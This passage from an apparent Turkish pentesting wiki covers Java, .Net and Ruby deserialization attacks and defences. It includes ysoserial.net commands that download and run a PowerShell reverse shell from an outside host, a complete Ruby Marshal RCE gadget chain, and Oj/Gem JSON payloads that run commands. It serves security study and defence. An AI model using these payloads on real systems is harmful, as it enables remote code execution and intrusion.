**Daha fazla exploit oluşturmak için** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ve ysoserial'i kullanabilirsiniz**. Bu aracın daha fazla bilgisi, aracın sunulduğu **konuşmanın slaytlarında** bulunmaktadır: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec), Java'daki farklı **Json** ve **Yml** serileştirme kütüphanelerini istismar etmek için yükler oluşturmak üzere kullanılabilir.\
Projeyi derlemek için `pom.xml` dosyasına bu **bağımlılıkları** **eklemem** gerekti:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Maven'ı yükleyin** ve **projeyi derleyin**:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Bu Java JSON kütüphanesi hakkında daha fazla bilgi edinin: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

- Bazı ysoserial payload'larını test etmek istiyorsanız **bu web uygulamasını çalıştırabilirsiniz**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Neden

Java, çeşitli amaçlar için çok fazla serileştirme kullanır:

- **HTTP istekleri**: Serileştirme, parametrelerin, ViewState'in, çerezlerin vb. yönetiminde yaygın olarak kullanılmaktadır.
- **RMI (Uzak Yöntem Çağrısı)**: Tamamen serileştirmeye dayanan Java RMI protokolü, Java uygulamalarında uzak iletişim için bir köşe taşıdır.
- **HTTP üzerinden RMI**: Bu yöntem, tüm nesne iletişimleri için serileştirmeyi kullanan Java tabanlı kalın istemci web uygulamaları tarafından yaygın olarak kullanılmaktadır.
- **JMX (Java Yönetim Uzantıları)**: JMX, nesneleri ağ üzerinden iletmek için serileştirmeyi kullanır.
- **Özel Protokoller**: Java'da, standart uygulama, ham Java nesnelerinin iletimini içerir; bu, gelecek istismar örneklerinde gösterilecektir.

### Önleme

#### Geçici nesneler

`Serializable` uygulayan bir sınıf, serileştirilemeyecek herhangi bir nesneyi sınıf içinde `transient` olarak uygulayabilir. Örneğin:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializable'ı Uygulaması Gereken Bir Sınıfın Serileştirilmesinden Kaçının

Belirli **nesnelerin sınıf hiyerarşisi nedeniyle `Serializable`** arayüzünü uygulaması gereken senaryolarda, istemeden deserialization riski vardır. Bunu önlemek için, aşağıda gösterildiği gibi, bu nesnelerin deserializable olmalarını sağlamak için sürekli bir istisna fırlatan `final` `readObject()` yöntemi tanımlayın:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Java'da Deserialization Güvenliğini Artırma**

**`java.io.ObjectInputStream`'i Özelleştirmek**, deserialization süreçlerini güvence altına almak için pratik bir yaklaşımdır. Bu yöntem, aşağıdaki durumlarda uygundur:

- Deserialization kodu kontrolünüz altındadır.
- Deserialization için beklenen sınıflar bilinmektedir.

Sadece izin verilen sınıflara deserialization'ı sınırlamak için **`resolveClass()`** yöntemini geçersiz kılın. Bu, yalnızca açıkça izin verilen sınıfların, örneğin deserialization'ı yalnızca `Bicycle` sınıfı ile sınırlayan aşağıdaki örnekte olduğu gibi, deserialization'ını önler:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Güvenlik Geliştirmesi için Java Ajansı Kullanımı** kod değişikliğinin mümkün olmadığı durumlarda bir geri dönüş çözümü sunar. Bu yöntem esasen **zararlı sınıfları kara listeye alma** için bir JVM parametresi kullanır:
```
-javaagent:name-of-agent.jar
```
Dinamik olarak deserialization'ı güvence altına almanın bir yolunu sağlar, anlık kod değişikliklerinin pratik olmadığı ortamlarda idealdir.

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) örneğine bakın.

**Serileştirme Filtrelerinin Uygulanması**: Java 9, **`ObjectInputFilter`** arayüzü aracılığıyla serileştirme filtrelerini tanıttı ve serileştirilmiş nesnelerin deserialization'dan önce karşılaması gereken kriterleri belirlemek için güçlü bir mekanizma sağladı. Bu filtreler, deserialization süreci üzerinde ayrıntılı kontrol sunarak küresel veya akış başına uygulanabilir.

Serileştirme filtrelerini kullanmak için, tüm deserialization işlemlerine uygulanan küresel bir filtre ayarlayabilir veya belirli akışlar için dinamik olarak yapılandırabilirsiniz. Örneğin:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Dış Kütüphaneleri Kullanarak Güvenliği Artırma**: **NotSoSerial**, **jdeserialize** ve **Kryo** gibi kütüphaneler, Java deserialization'ını kontrol etme ve izleme için gelişmiş özellikler sunar. Bu kütüphaneler, deserialization'dan önce serileştirilmiş nesneleri analiz etme, sınıfları beyaz listeye alma veya kara listeye alma gibi ek güvenlik katmanları sağlayabilir ve özel serileştirme stratejileri uygulayabilir.

- **NotSoSerial**, güvensiz kodun çalıştırılmasını önlemek için deserialization süreçlerini kesintiye uğratır.
- **jdeserialize**, serileştirilmiş Java nesnelerinin deserialization işlemi yapılmadan analiz edilmesine olanak tanır ve potansiyel olarak zararlı içeriği tanımlamaya yardımcı olur.
- **Kryo**, hız ve verimliliğe vurgu yapan alternatif bir serileştirme çerçevesidir ve güvenliği artırabilecek yapılandırılabilir serileştirme stratejileri sunar.

### Referanslar

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization ve ysoserial konuşması: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Gadgetinspector hakkında konuşma: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ve slaytlar: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec makalesi: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java ve .Net JSON deserialization **makalesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuşma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialization CVE'leri: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Enjeksiyonu & log4Shell

**JNDI Enjeksiyonu nedir, RMI, CORBA & LDAP aracılığıyla nasıl kötüye kullanılır ve log4shell'i nasıl istismar edilir** (ve bu zafiyetin bir örneği) aşağıdaki sayfada bulabilirsiniz:

{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Mesaj Servisi

> **Java Mesaj Servisi** (**JMS**) API'si, iki veya daha fazla istemci arasında mesaj göndermek için kullanılan bir Java mesaj odaklı ara yazılım API'sidir. Üretici-tüketici sorununu çözmek için bir uygulamadır. JMS, Java Platformu, Kurumsal Sürüm (Java EE) parçasıdır ve Sun Microsystems tarafından geliştirilen bir spesifikasyonla tanımlanmıştır, ancak o zamandan beri Java Topluluk Süreci tarafından yönlendirilmiştir. Java EE'ye dayalı uygulama bileşenlerinin mesaj oluşturmasına, göndermesine, almasına ve okumasına olanak tanıyan bir mesajlaşma standardıdır. Dağıtık bir uygulamanın farklı bileşenleri arasında iletişimin gevşek bir şekilde bağlı, güvenilir ve asenkron olmasını sağlar. (Kaynak: [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Ürünler

Bu ara yazılımı kullanarak mesaj gönderen birkaç ürün bulunmaktadır:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### İstismar

Temelde, **tehlikeli bir şekilde JMS kullanan birçok hizmet bulunmaktadır**. Bu nedenle, bu hizmetlere mesaj göndermek için **yeterli ayrıcalıklara** sahipseniz (genellikle geçerli kimlik bilgilerine ihtiyacınız olacaktır), **tüketici/abone tarafından deserialization yapılacak kötü niyetli serileştirilmiş nesneler** gönderebilirsiniz.\
Bu, bu istismar sırasında **o mesajı kullanacak tüm istemcilerin enfekte olacağı** anlamına gelir.

Bir hizmetin zayıf olduğunu hatırlamalısınız (çünkü kullanıcı girdisini güvensiz bir şekilde deserialization yapıyorsa), yine de zafiyeti istismar etmek için geçerli gadget'lar bulmanız gerekir.

[**JMET**](https://github.com/matthiaskaiser/jmet) aracı, **bilinen gadget'lar kullanarak birkaç kötü niyetli serileştirilmiş nesne göndererek bu hizmetlere bağlanmak ve saldırmak** için oluşturulmuştur. Bu istismarlar, hizmet hala zayıfsa ve kullanılan gadget'lardan herhangi biri zayıf uygulamanın içinde bulunuyorsa çalışacaktır.

### Referanslar

- [Patchstack danışmanlığı – Everest Forms kimlik doğrulaması yapılmamış PHP Nesne Enjeksiyonu (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET konuşması: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slaytlar: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net bağlamında, deserialization istismarları, bir nesnenin deserialization'ı sırasında belirli kodları çalıştırmak için gadget'ların istismar edilmesi şeklinde çalışır.

### Parmak İzi

#### Beyaz Kutu

Kaynak kodu, aşağıdaki terimlerin geçişlerini kontrol etmek için incelenmelidir:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Odak, türün kullanıcı kontrolündeki bir değişkenle belirlenmesine izin veren serileştiriciler üzerinde olmalıdır.

#### Siyah Kutu

Arama, sunucu tarafında deserialization yapılabilecek **AAEAAAD/////** veya benzeri bir Base64 kodlu dizeyi hedef almalıdır; bu, deserialization yapılacak tür üzerinde kontrol sağlar. Bu, **JSON** veya `TypeObject` veya `$type` içeren **XML** yapıları gibi olabilir.

### ysoserial.net

Bu durumda, **deserialization istismarlarını oluşturmak için [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) aracını** kullanabilirsiniz. Git deposunu indirdikten sonra, aracı **örneğin Visual Studio kullanarak derlemelisiniz**.

**ysoserial.net'in istismarını nasıl oluşturduğunu** öğrenmek istiyorsanız, [**ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter'ının açıklandığı bu sayfayı kontrol edebilirsiniz**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

**ysoserial.net**'in ana seçenekleri: **`--gadget`**, **`--formatter`**, **`--output`** ve **`--plugin`.**

- **`--gadget`**, istismar edilecek gadget'ı belirtmek için kullanılır (deserialization sırasında komutları çalıştırmak için istismar edilecek sınıf/fonksiyonu belirtir).
- **`--formatter`**, istismarı serileştirmek için kullanılacak yöntemi belirtmek için kullanılır (payload'ı deserialization yapmak için arka uçta hangi kütüphanenin kullanıldığını bilmeniz ve aynı kütüphaneyi kullanarak serileştirmeniz gerekir).
- **`--output`**, istismarı **ham** veya **base64** kodlu olarak almak isteyip istemediğinizi belirtmek için kullanılır. _Not: **ysoserial.net**, payload'ı **UTF-16LE** kullanarak **kodlayacaktır** (Windows'ta varsayılan olarak kullanılan kodlama), bu nedenle ham veriyi alıp sadece bir linux konsolundan kodlarsanız, istismarın düzgün çalışmasını engelleyecek bazı **kodlama uyumluluğu sorunları** yaşayabilirsiniz (HTB JSON kutusunda payload hem UTF-16LE hem de ASCII'de çalıştı, ancak bu her zaman çalışacağı anlamına gelmez)._
- **`--plugin`**, ysoserial.net, **belirli çerçeveler için istismarlar oluşturmak** üzere eklentileri destekler, örneğin ViewState.

#### Daha fazla ysoserial.net parametreleri

- `--minify`, **daha küçük bir payload** sağlayacaktır (mümkünse)
- `--raf -f Json.Net -c "anything"` Bu, sağlanan bir formatter ile kullanılabilecek tüm gadget'ları gösterecektir (bu durumda `Json.Net`).
- `--sf xml`, bir gadget'ı (`-g`) **belirtebilir** ve ysoserial.net "xml" içeren formatörleri arayacaktır (büyük/küçük harf duyarsız).

**ysoserial örnekleri** ile istismar oluşturma:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ayrıca her bir exploitin nasıl çalıştığını daha iyi anlamaya yardımcı olan **çok ilginç bir parametreye** sahiptir: `--test`\
Bu parametreyi belirtirseniz **ysoserial.net** **yerel olarak** **exploit'i dener**, böylece yüklemenizin doğru çalışıp çalışmadığını test edebilirsiniz.\
Bu parametre faydalıdır çünkü kodu gözden geçirirseniz aşağıdaki gibi kod parçaları bulacaksınız ( [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Bu, istismarı test etmek için kodun [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) çağıracağı anlamına gelir.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **önceki kod, oluşturulan istismara karşı savunmasızdır**. Bu nedenle, bir .Net uygulamasında benzer bir şey bulursanız, muhtemelen o uygulama da savunmasızdır.\
Bu nedenle **`--test`** parametresi, **hangi kod parçalarının** **ysoserial.net** tarafından oluşturulan deserialization istismarına karşı savunmasız olduğunu anlamamıza olanak tanır.

### ViewState

[**.Net'in \_\_ViewState parametresini istismar etmeye nasıl çalışılacağı hakkında bu POST'a**](exploiting-__viewstate-parameter.md) bakın **rastgele kod çalıştırmak için.** Eğer **kurban makinesinin** kullandığı sırları **zaten biliyorsanız**, [**kod çalıştırmayı öğrenmek için bu yazıyı okuyun**](exploiting-__viewstate-knowing-the-secret.md)**.**

### Önleme

.Net'te deserialization ile ilişkili riskleri azaltmak için:

- **Veri akışlarının nesne türlerini tanımlamasına izin vermekten kaçının.** Mümkünse `DataContractSerializer` veya `XmlSerializer` kullanın.
- **`JSON.Net` için `TypeNameHandling`'i `None` olarak ayarlayın:** `TypeNameHandling = TypeNameHandling.None`
- **`JavaScriptSerializer`'ı `JavaScriptTypeResolver` ile kullanmaktan kaçının.**
- **Deserialized edilebilecek türleri sınırlayın**, `System.IO.FileInfo` gibi .Net türleri ile ilgili içsel riskleri anlayarak, bu türler sunucu dosyalarının özelliklerini değiştirebilir ve hizmet reddi saldırılarına yol açabilir.
- **Riskli özelliklere sahip türlerle dikkatli olun**, `Value` özelliği ile `System.ComponentModel.DataAnnotations.ValidationException` gibi, istismar edilebilir.
- **Tür örneklemesini güvenli bir şekilde kontrol edin**; bu, saldırganların deserialization sürecini etkilemesini önler ve hatta `DataContractSerializer` veya `XmlSerializer`'ı savunmasız hale getirebilir.
- **`BinaryFormatter` ve `JSON.Net` için özel bir `SerializationBinder` kullanarak beyaz liste kontrolleri uygulayın.**
- **.Net içinde bilinen güvensiz deserialization aletleri hakkında bilgi sahibi olun** ve deserializer'ların bu türleri örneklemediğinden emin olun.
- **Potansiyel olarak riskli kodu** internet erişimi olan koddan izole edin, böylece `System.Windows.Data.ObjectDataProvider` gibi bilinen aletleri güvensiz veri kaynaklarına maruz bırakmaktan kaçının.

### **Referanslar**

- Java ve .Net JSON deserialization **belgesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuşma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby'de, serialization **marshal** kütüphanesindeki iki yöntemle sağlanır. İlk yöntem, **dump** olarak bilinir ve bir nesneyi bir byte akışına dönüştürmek için kullanılır. Bu işleme serialization denir. Tersine, ikinci yöntem **load** olarak adlandırılır ve bir byte akışını tekrar bir nesneye döndürmek için kullanılır; bu işleme ise deserialization denir.

Serileştirilmiş nesneleri güvence altına almak için **Ruby, HMAC (Hash-Based Message Authentication Code)** kullanır ve verilerin bütünlüğünü ve doğruluğunu sağlar. Bu amaçla kullanılan anahtar, birkaç olası konumdan birinde saklanır:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X genel deserialization'dan RCE alet zincirine (daha fazla bilgi için** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Diğer RCE zinciri Ruby On Rails'i istismar etmek için: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metodu

[**bu güvenlik açığı raporunda**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) açıklandığı gibi, bazı kullanıcıdan gelen temizlenmemiş girdi `.send()` metoduna ulaştığında, bu metod nesnenin **herhangi bir diğer metodunu** herhangi bir parametre ile çağırmaya izin verir.

Örneğin, eval çağırmak ve ardından ruby kodunu ikinci parametre olarak vermek, rastgele kodun çalıştırılmasına olanak tanır:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Ayrıca, eğer **`.send()`** metodunun yalnızca bir parametresi bir saldırgan tarafından kontrol ediliyorsa, önceki yazıda belirtildiği gibi, **argüman gerektirmeyen** veya argümanlarının **varsayılan değerleri** olan herhangi bir nesne metodunu çağırmak mümkündür.\
Bunun için, bu gereksinimleri karşılayan **ilginç metodları bulmak üzere nesnenin tüm metodlarını listelemek** mümkündür.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby sınıf kirlenmesi

Bir Ruby sınıfını nasıl [kirletebileceğinizi ve bunu burada nasıl kötüye kullanabileceğinizi kontrol edin](ruby-class-pollution.md).

### Ruby _json kirlenmesi

Bir gövdeye, bir dizi gibi hashlenemeyen bazı değerler gönderildiğinde, bunlar `_json` adlı yeni bir anahtara eklenecektir. Ancak, bir saldırganın gövdeye istediği keyfi değerlerle `_json` adlı bir değer de ayarlaması mümkündür. Örneğin, arka uç bir parametrenin doğruluğunu kontrol ederse ancak ardından `_json` parametresini bir eylem gerçekleştirmek için kullanırsa, bir yetkilendirme atlatması gerçekleştirilebilir.

Daha fazla bilgi için [Ruby _json kirlenmesi sayfasını](ruby-_json-pollution.md) kontrol edin.

### Diğer kütüphaneler

Bu teknik [**bu blog yazısından**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared) alınmıştır.

RCE elde etmek için kötüye kullanılabilecek nesneleri serileştirmek için kullanılabilecek diğer Ruby kütüphaneleri vardır. Aşağıdaki tablo, bu kütüphanelerden bazılarını ve yüklenen kütüphaneden serileştirilmediğinde çağrılan yöntemleri göstermektedir (temelde RCE elde etmek için kötüye kullanılacak fonksiyon):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Kütüphane</strong></td><td><strong>Girdi verisi</strong></td><td><strong>Sınıf içindeki başlatma yöntemi</strong></td></tr><tr><td>Marshal (Ruby)</td><td>İkili</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (sınıfın hash(maps) içinde anahtar olarak yer alması gerekir)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (sınıfın hash(maps) içinde anahtar olarak yer alması gerekir)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (sınıfın hash(maps) içinde anahtar olarak yer alması gerekir)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([json_create ile ilgili notlara bakın](#table-vulnerable-sinks) son)</td></tr></tbody></table>

Temel örnek:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Oj'yi kötüye kullanmaya çalışırken, `hash` fonksiyonu içinde `to_s` çağrısı yapan bir gadget sınıfı bulmak mümkün oldu. Bu, spec'i çağıracak ve fetch_path'i çağıracak şekildeydi; bu da rastgele bir URL almasını sağladı ve bu tür sanitizasyon yapılmamış deserialization zafiyetlerinin harika bir dedektörünü sağladı.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Ayrıca, önceki teknikle birlikte sistemde bir klasörün de oluşturulduğu, bunun başka bir gadget'ı kötüye kullanmak için bir gereklilik olduğu ve bunun bir RCE'ye dönüştürülmesi gerektiği bulundu:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Gerçekten bir deserialization zafiyeti değil ama bir Rails uygulamasından keyfi dosya yazımı ile RCE elde etmek için bootstrap caching'i kötüye kullanmak için güzel bir numara (tam [orijinal yazıyı burada](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/) bulabilirsiniz).

Aşağıda, Bootsnap caching'i kötüye kullanarak keyfi dosya yazma zafiyetini istismar etmek için makalede detaylandırılan adımların kısa bir özeti bulunmaktadır:

- Vulnerability and Environment'i Belirleyin

Rails uygulamasının dosya yükleme işlevi, bir saldırganın dosyaları keyfi olarak yazmasına izin verir. Uygulama kısıtlamalarla çalışsa da (Docker'ın kök olmayan kullanıcısı nedeniyle yalnızca tmp gibi belirli dizinler yazılabilir), bu yine de Bootsnap önbellek dizinine yazmaya izin verir (genellikle tmp/cache/bootsnap altında).

- Bootsnap’ın Önbellek Mekanizmasını Anlayın

